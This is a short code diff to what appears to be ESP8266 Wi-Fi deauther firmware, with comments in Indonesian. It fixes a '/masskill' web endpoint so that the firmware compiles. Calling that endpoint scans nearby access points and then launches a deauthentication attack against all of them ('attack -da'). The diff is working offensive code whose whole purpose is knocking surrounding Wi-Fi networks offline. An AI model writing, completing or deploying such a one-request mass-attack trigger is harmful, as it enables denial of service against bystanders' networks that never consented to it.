@@ -127,18 +127,18 @@ void setup() {
         Serial.end();
     }
 
-    // --- BAGIAN INI DIUBAH SEDIKIT UNTUK MENYELIPKAN MODE MASS KILL ---
+    // --- FIX HANDLER SERVER ---
     if (settings::getWebSettings().enabled) {
         wifi::startAP();
         
-        // Selipan Mode Mass Kill (Tanpa sunat ori)
-        server.on("/masskill", []() {
+        // Menggunakan wifi::server agar 'server' terdeteksi oleh compiler
+        wifi::server.on("/masskill", []() {
             attack.stop();
             scan.stop();
             accesspoints.removeAll();
-            cli.runCommand("scan aps -t 15s"); // Scan otomatis
-            cli.runCommand("attack -da");      // Attack all
-            server.send(200, "text/plain", "OK");
+            cli.runCommand("scan aps -t 15s"); 
+            cli.runCommand("attack -da");      
+            wifi::server.send(200, "text/plain", "OK");
         });
     }
 
@@ -161,7 +161,6 @@ unsigned long kedip = 0;
 int nyala = 0;
 
 void loop() {
-    // SEMUA ISI LOOP TETAP ORI SESUAI FILE LU
     currentTime = millis();
     
     if(attack.resume() == true){
